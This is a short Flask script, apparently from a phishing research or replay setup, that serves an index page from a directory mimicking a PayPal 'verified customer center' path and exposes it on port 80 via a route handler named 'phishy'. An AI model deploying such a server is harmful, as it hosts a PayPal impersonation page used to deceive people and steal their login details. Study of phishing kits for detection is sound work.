from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='apply.aui.ma/assets/mypaypalverified/customer_center/user-578862')

@app.route('/assets/mypaypalverified/customer_center/user-578862')
def phishy():
    return render_template('index.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)